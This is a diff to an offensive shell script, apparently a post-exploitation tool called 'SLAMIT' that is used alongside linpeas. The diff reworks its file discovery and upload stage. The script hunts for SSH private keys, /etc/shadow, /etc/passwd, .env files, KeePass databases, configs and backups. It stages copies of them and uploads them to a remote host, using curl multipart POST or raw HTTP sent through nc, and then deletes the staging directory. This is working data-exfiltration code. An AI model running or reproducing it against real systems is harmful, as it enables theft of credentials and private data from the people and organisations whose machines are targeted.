@@ -236,9 +236,18 @@ echo ""
 
 printSectionTitle "File Discovery and Upload"
 
-# Space-separated list of extensions
-EXTENSIONS="pdf txt log pdf zip doc docx xls xlsx ppt pptx csv ini conf cfg env
-    yaml yml json xml ps1 bat cmd sh kdbx rdp 7z rar tar gz bak old tmp db sqlite
+# Create a dedicated staging directory for discovered files
+STAGING_DIR="$EXFIL_LOCATION/SLAMIT_Discovered_Files"
+if [ -d "$STAGING_DIR" ]; then
+    rm -rf "$STAGING_DIR"
+fi
+mkdir -p "$STAGING_DIR"
+
+echo "Created staging directory: $STAGING_DIR"
+
+# Space-separated list of extensions (exclude .sh to avoid script contamination)
+EXTENSIONS="pdf txt log zip doc docx xls xlsx ppt pptx csv ini conf cfg env
+    yaml yml json xml kdbx rdp 7z rar tar gz bak old tmp db sqlite
     sqlite3 mdb accdb rtf md";
 SPECIFIC_FILES="proof.txt local.txt id_rsa id_ecdsa \.git* /etc/passwd /etc/shadow";
 
@@ -280,93 +289,134 @@ done
 
 echo "Completed FIND_CMD = $FIND_CMD";
 
-# Count total files first and store in a file to avoid subshell issues
-TEMP_COUNT_FILE=$(mktemp)
-eval "$FIND_CMD" | wc -l > "$TEMP_COUNT_FILE"
-TOTAL_FILES=$(cat "$TEMP_COUNT_FILE")
-rm -f "$TEMP_COUNT_FILE"
+# First, stage all discovered files to prevent duplicates and contamination
+echo "Staging discovered files to prevent duplicates..."
 
-echo "Found $TOTAL_FILES files to upload"
+# Use temporary files to avoid subshell variable scope issues
+STAGED_FILES_LIST=$(mktemp)
+STAGED_COUNT=0
 
-# Initialize counter for uploads
-UPLOAD_COUNT=0
+# Evaluate the find command and stage files
+eval "$FIND_CMD" | while IFS= read -r FILE; do
+    if [ -f "$FILE" ] && [ -r "$FILE" ]; then
+        FILENAME=$(basename "$FILE")
+        
+        # Create unique filename to avoid conflicts
+        TARGET_PATH="$STAGING_DIR/$FILENAME"
+        COUNTER=1
+        
+        # Handle conflicts by adding -1, -2, etc.
+        while [ -f "$TARGET_PATH" ]; do
+            BASE_NAME=$(echo "$FILENAME" | sed 's/\.[^.]*$//')
+            EXTENSION=$(echo "$FILENAME" | sed 's/.*\.//')
+            TARGET_PATH="$STAGING_DIR/${BASE_NAME}-${COUNTER}.${EXTENSION}"
+            COUNTER=$((COUNTER + 1))
+        done
+        
+        # Copy file to staging directory
+        if cp "$FILE" "$TARGET_PATH" 2>/dev/null; then
+            echo "$TARGET_PATH" >> "$STAGED_FILES_LIST"
+            echo "Staged: $FILENAME → $TARGET_PATH"
+        else
+            echo "Failed to stage: $FILENAME"
+        fi
+    fi
+done
 
-echo "Starting upload of $TOTAL_FILES files..."
+# Get the actual count of staged files
+STAGED_COUNT=$(wc -l < "$STAGED_FILES_LIST" 2>/dev/null || echo "0")
+
+echo "Successfully staged $STAGED_COUNT files to: $STAGING_DIR"
+
+# Now upload only the staged files
+if [ "$STAGED_COUNT" -eq 0 ] || [ "$STAGED_COUNT" -eq "0" ]; then
+    echo "No files staged. Nothing to upload."
+    rm -f "$STAGED_FILES_LIST"
+    exit 0
+fi
+
+echo "Starting upload of $STAGED_COUNT staged files..."
 
 # Initialize counters
+UPLOAD_COUNT=0
 SUCCESS_COUNT=0
 FAILED_COUNT=0
 
-# Evaluate the find command and loop through files
-eval "$FIND_CMD" | while IFS= read -r FILE; do
-    FILENAME=$(basename "$FILE");
-    UPLOAD_COUNT=$((UPLOAD_COUNT + 1))
+# Upload staged files by reading from the temporary file
+while IFS= read -r STAGED_FILE; do
+    if [ -f "$STAGED_FILE" ]; then
+        FILENAME=$(basename "$STAGED_FILE")
+        UPLOAD_COUNT=$((UPLOAD_COUNT + 1))
 
-    # Show progress every 10 files or for the last file
-    if [ $((UPLOAD_COUNT % 10)) -eq 0 ] || [ $UPLOAD_COUNT -eq $TOTAL_FILES ]; then
-        echo "Progress: [$UPLOAD_COUNT/$TOTAL_FILES] files processed"
-    fi
-
-    # Upload using curl with multipart form (silent)
-
-    if  [ "$SYSTEM_HAS_CURL" -eq 1 ]; then
-        RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null -X POST "$URL" \
-            -F "folder=$TARGET_FOLDER" \
-            -F "file=@$FILE;filename=$FILENAME" \
-            -H "Expect:");
-        # Check if upload was successful
-        if [ "$RESPONSE" -ge 200 ] && [ "$RESPONSE" -lt 300 ]; then
-            SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
-        else
-            FAILED_COUNT=$((FAILED_COUNT + 1))
+        # Show progress every 10 files or for the last file
+        if [ $((UPLOAD_COUNT % 10)) -eq 0 ] || [ $UPLOAD_COUNT -eq $STAGED_COUNT ]; then
+            echo "Progress: [$UPLOAD_COUNT/$STAGED_COUNT] files processed"
         fi
-    else
-        # Write data to temporary files to be able to handle binary data.
-        TMPFILE=$(mktemp);
 
-        # Write the first part (folder field)
-        {
-        printf -- "--%s\r\n" "$BOUNDARY";
-        printf "Content-Disposition: form-data; name=\"folder\"\r\n";
-        printf "\r\n";
-        printf "%s\r\n" "$TARGET_FOLDER";
+        # Upload using curl with multipart form (silent)
 
-        # Write the file headers
-        printf -- "--%s\r\n" "$BOUNDARY";
-        printf "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n" "$FILENAME";
-        printf "Content-Type: application/octet-stream\r\n";
-        printf "\r\n";
-        } > "$TMPFILE";
-
-        cat "$FILE" >> "$TMPFILE";
-
-        # Append closing boundary
-        printf "\r\n--%s--\r\n" "$BOUNDARY" >> "$TMPFILE";
-
-        # Get accurate content length
-        CONTENT_LENGTH=$(wc -c < "$TMPFILE");
-
-        # Send the HTTP request using netcat
-        {
-        printf "POST / HTTP/1.1\r\n";
-        printf "Host: %s:%s\r\n" "$URI" "$PORT";
-        printf "Content-Type: multipart/form-data; boundary=%s\r\n" "$BOUNDARY";
-        printf "Content-Length: %s\r\n" "$CONTENT_LENGTH";
-        printf "Expect:\r\n";
-        printf "\r\n";
-        cat "$TMPFILE";
-        } | nc "$URI" "$PORT" >/dev/null 2>&1;
-
-        # Clean up
-        rm -f "$TMPFILE";
-
-        if [ $? -eq 0 ]; then
-            SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
+        if  [ "$SYSTEM_HAS_CURL" -eq 1 ]; then
+            RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null -X POST "$URL" \
+                -F "folder=$TARGET_FOLDER" \
+                -F "file=@$STAGED_FILE;filename=$FILENAME" \
+                -H "Expect:");
+            # Check if upload was successful
+            if [ "$RESPONSE" -ge 200 ] && [ "$RESPONSE" -lt 300 ]; then
+                SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
+            else
+                FAILED_COUNT=$((FAILED_COUNT + 1))
+            fi
         else
-            FAILED_COUNT=$((FAILED_COUNT + 1))
+            # Write data to temporary files to be able to handle binary data.
+            TMPFILE=$(mktemp);
+
+            # Write the first part (folder field)
+            {
+            printf -- "--%s\r\n" "$BOUNDARY";
+            printf "Content-Disposition: form-data; name=\"folder\"\r\n";
+            printf "\r\n";
+            printf "%s\r\n" "$TARGET_FOLDER";
+
+            # Write the file headers
+            printf -- "--%s\r\n" "$BOUNDARY";
+            printf "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n" "$FILENAME";
+            printf "Content-Type: application/octet-stream\r\n";
+            printf "\r\n";
+            } > "$TMPFILE";
+
+            cat "$STAGED_FILE" >> "$TMPFILE";
+
+            # Append closing boundary
+            printf "\r\n--%s--\r\n" "$BOUNDARY" >> "$TMPFILE";
+
+            # Get accurate content length
+            CONTENT_LENGTH=$(wc -c < "$TMPFILE");
+
+            # Send the HTTP request using netcat
+            {
+            printf "POST / HTTP/1.1\r\n";
+            printf "Host: %s:%s\r\n" "$URI" "$PORT";
+            printf "Content-Type: multipart/form-data; boundary=%s\r\n" "$BOUNDARY";
+            printf "Content-Length: %s\r\n" "$CONTENT_LENGTH";
+            printf "Expect:\r\n";
+            printf "\r\n";
+            cat "$TMPFILE";
+            } | nc "$URI" "$PORT" >/dev/null 2>&1;
+
+            # Clean up
+            rm -f "$TMPFILE";
+
+            if [ $? -eq 0 ]; then
+                SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
+            else
+                FAILED_COUNT=$((FAILED_COUNT + 1))
+            fi
         fi
     fi
-done;
+done < "$STAGED_FILES_LIST"
+
+# Clean up temporary file
+rm -f "$STAGED_FILES_LIST"
 
 # Pretty print summary
 echo ""
@@ -381,10 +431,19 @@ echo ""
 
 echo "Upload complete! Total files uploaded: $UPLOAD_COUNT"
 
+# Cleanup staging directory
+echo ""
+echo "Cleaning up staging directory..."
+if [ -d "$STAGING_DIR" ]; then
+    rm -rf "$STAGING_DIR"
+    echo "Cleaned up staging directory: $STAGING_DIR"
+fi
+
 # Final completion message
 echo ""
 printSectionTitle "SLAMIT COMPLETE"
 echo "All operations completed successfully!"
+echo "Files were staged, uploaded, and cleaned up automatically."
 echo "Check the output files for enumeration results:"
 echo "  - $OUTPUT_FILE"
 echo "  - $OUTPUT_LINPEAS" 
